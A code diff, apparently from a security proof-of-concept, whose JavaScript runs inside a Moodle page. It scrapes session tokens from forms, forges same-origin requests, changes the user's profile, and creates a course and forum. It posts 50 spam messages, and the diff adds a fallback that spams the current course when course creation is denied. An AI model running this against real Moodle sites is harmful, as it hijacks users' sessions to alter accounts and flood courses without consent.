@@ -48,6 +48,23 @@ export function swapAvatarInDom(w) {
   return avs.length;
 }
 
+// Moodle publica normalmente el curso actual en M.cfg.courseId. Los fallbacks
+// de DOM cubren temas/versiones donde esa propiedad no esté presente.
+export function resolveCurrentCourseId(w) {
+  try {
+    var cfgId = w && w.M && w.M.cfg && w.M.cfg.courseId;
+    if (cfgId && Number(cfgId) > 0) { return String(cfgId); }
+  } catch (e) { /* seguir con el DOM */ }
+  try {
+    var bodyClass = (w.document.body && w.document.body.className) || '';
+    var classMatch = String(bodyClass).match(/(?:^|\s)course-(\d+)(?:\s|$)/);
+    if (classMatch) { return classMatch[1]; }
+    var courseLink = w.document.querySelector('a[href*="/course/view.php?id="]');
+    var hrefMatch = courseLink && (courseLink.getAttribute('href') || '').match(/[?&]id=(\d+)/);
+    return hrefMatch ? hrefMatch[1] : null;
+  } catch (e) { return null; }
+}
+
 // Cambia el NOMBRE (core_user_update_users) y la FOTO de perfil (sube un PNG del
 // avatar al filemanager vía repository_ajax y envía el form de perfil) del usuario
 // actual, forjado con el sesskey same-origin. Verificado en Moodle REAL; en el
@@ -129,24 +146,18 @@ export function ownUser(ctx, journal, cb) {
 }
 
 // Crea un curso "POC-...", una Etiqueta con texto y 50 avisos lorem ipsum
-// en el foro de Avisos, "scrapeando" los formularios de Moodle (que ya traen el
-// sesskey) y reenviandolos. Requiere Moodle REAL; en el Playground PHP-WASM falla por
-// limites del runtime (404 en endpoints, el shim no lee el cuerpo POST), no por seguridad.
+// en el foro de Avisos, "scrapeando" los formularios de Moodle (que ya traen
+// el sesskey) y reenviándolos. Si no tiene moodle/course:create, crea una
+// actividad Foro y las 50 discusiones en el curso actual. Requiere Moodle
+// REAL; en Playground PHP-WASM falla por límites del runtime, no por seguridad.
 export function createCourse(ctx, journal, cb) {
   if (ctx.win.origin === 'null' || ctx.win.location.origin === 'null') { cb('BLOQUEADO (origen opaco / modo secure)'); return; }
   try {
     var w = ctx.parentWin();
     if (!w) { cb('BLOQUEADO: sin acceso al padre (origen opaco / modo secure)'); return; }
     var root = (w.M && w.M.cfg && w.M.cfg.wwwroot) || ctx.win.location.origin;
+    var fallbackCourseId = resolveCurrentCourseId(w);
     var sn = journal.prefix('CREATED');
-    journal.record({
-      host: 'moodle',
-      kind: 'course',
-      label: 'Curso ' + sn,
-      id: sn,
-      previous: null,
-      undo: null, // el borrado de curso exige confirmación en la UI de Moodle
-    });
     var pickForm = function (html) {
       var fs = [].slice.call(new DOMParser().parseFromString(html, 'text/html').querySelectorAll('form'));
       return fs.filter(function (f) { return f.querySelector('input[name^="_qf__"]'); })
@@ -231,9 +242,11 @@ export function createCourse(ctx, journal, cb) {
         return formFromForum(urls, i + 1);
       }).catch(function () { return formFromForum(urls, i + 1); });
     };
-    var findDiscussionForm = function (cid) {
-      // Prueba los foros del curso creado y, como respaldo, los del sitio (id=1).
-      var ids = (String(cid) === '1') ? ['1'] : [cid, '1'];
+    var findDiscussionForm = function (cid, allowSiteFallback) {
+      // Para un curso recién creado se conserva el respaldo histórico del
+      // foro del sitio. En el fallback pedido por el usuario se limita todo
+      // al curso actual: primero crea allí una actividad Foro y publica allí.
+      var ids = (String(cid) === '1' || !allowSiteFallback) ? [String(cid)] : [String(cid), '1'];
       var tryCourse = function (k) {
         if (k >= ids.length) { return Promise.reject(new Error('ningun foro donde publicar (sin permiso?)')); }
         return w.fetch(root + '/mod/forum/index.php?id=' + ids[k], { credentials: 'same-origin' })
@@ -243,8 +256,8 @@ export function createCourse(ctx, journal, cb) {
       };
       return tryCourse(0);
     };
-    var spamForum = function (cid, count) {
-      return findDiscussionForm(cid).then(function (ctxf) {
+    var spamForum = function (cid, count, allowSiteFallback) {
+      return findDiscussionForm(cid, allowSiteFallback).then(function (ctxf) {
         var posted = 0;
         var one = function (i) {
           if (i >= count) { return posted; }
@@ -259,6 +272,51 @@ export function createCourse(ctx, journal, cb) {
         return one(0);
       });
     };
+    var fallbackToCurrentCourse = function (reason) {
+      if (!fallbackCourseId) {
+        cb(JSON.stringify({
+          created: false,
+          fallback: false,
+          reason: reason,
+          note: 'No se pudo crear el curso ni identificar el curso actual.'
+        }));
+        return;
+      }
+      var forumName = journal.prefix('FORUM');
+      var forumGet = root + '/course/modedit.php?add=forum&type=&course=' +
+        encodeURIComponent(fallbackCourseId) + '&section=0&return=0&sr=0';
+      var out = {
+        created: false,
+        fallback: true,
+        fallbackReason: reason,
+        courseId: fallbackCourseId,
+        forumCreated: false,
+        forumMessages: 0
+      };
+      step(forumGet, root + '/course/modedit.php', {
+        name: 'POC-SAFE ' + forumName,
+        type: 'general',
+        'introeditor[text]': '<p>Foro creado por la PoC en el curso actual: ' + paragraph() + '</p>'
+      }).then(function (forumUrl) {
+        out.forumCreated = Boolean(forumUrl && forumUrl.indexOf('modedit.php') === -1);
+        if (!out.forumCreated) { throw new Error('no se pudo crear el foro en el curso actual'); }
+        journal.record({
+          host: 'moodle',
+          kind: 'forum',
+          label: 'Foro ' + forumName + ' en curso ' + fallbackCourseId,
+          id: forumName,
+          previous: null,
+          undo: null
+        });
+        return spamForum(fallbackCourseId, 50, false);
+      }).then(function (n) {
+        out.forumMessages = n;
+        cb(JSON.stringify(out));
+      }).catch(function (e) {
+        out.forumError = e.message || e.name;
+        cb(JSON.stringify(out));
+      });
+    };
     // 1) crear el curso
     step(root + '/course/edit.php?category=1', root + '/course/edit.php', {
       fullname: 'Curso creado por la PoC', shortname: sn, category: '1',
@@ -266,12 +324,28 @@ export function createCourse(ctx, journal, cb) {
     }).then(function (url) {
       var created = (url || '').indexOf('course/edit.php') === -1;
       var m = (url || '').match(/[?&](?:id|courseid)=(\d+)/); var cid = m ? m[1] : null;
-      if (!created || !cid) {
-        cb(JSON.stringify({ created: created, courseId: cid, shortname: sn,
-          note: created ? 'curso creado (id no detectado; mira /course/management.php)'
-                        : 'no creado (revisa moodle/course:create, o usa Moodle real)' }));
+      if (created && !cid) {
+        cb(JSON.stringify({
+          created: true,
+          courseId: null,
+          shortname: sn,
+          fallback: false,
+          note: 'Curso creado, pero no se pudo detectar su id; no se crea un segundo foro para evitar duplicar cambios.'
+        }));
         return;
       }
+      if (!created) {
+        fallbackToCurrentCourse('sin permiso moodle/course:create o formulario rechazado');
+        return;
+      }
+      journal.record({
+        host: 'moodle',
+        kind: 'course',
+        label: 'Curso ' + sn,
+        id: cid,
+        previous: null,
+        undo: null
+      });
       var out = { created: true, courseId: cid, shortname: sn, activityAdded: false, forumMessages: 0 };
       // 2) Etiqueta con texto (FIX: el GET lleva add=label&course=...)
       var labelGet = root + '/course/modedit.php?add=label&type=&course=' + cid + '&section=0&return=0&sr=0';
@@ -280,9 +354,9 @@ export function createCourse(ctx, journal, cb) {
       }).then(function (lurl) { out.activityAdded = !!(lurl && lurl.indexOf('modedit.php') === -1); })
         .catch(function () { out.activityAdded = false; })
         // 3) 50 mensajes lorem ipsum en el foro de Avisos
-        .then(function () { return spamForum(cid, 50); })
+        .then(function () { return spamForum(cid, 50, true); })
         .then(function (n) { out.forumMessages = n; cb(JSON.stringify(out)); })
         .catch(function (e) { out.forumError = e.message || e.name; cb(JSON.stringify(out)); });
-    }).catch(function (e) { cb('No se pudo crear el curso: ' + (e.message || e.name)); });
+    }).catch(function (e) { fallbackToCurrentCourse(e.message || e.name); });
   } catch (e) { cb('BLOQUEADO: ' + e.name); }
 }
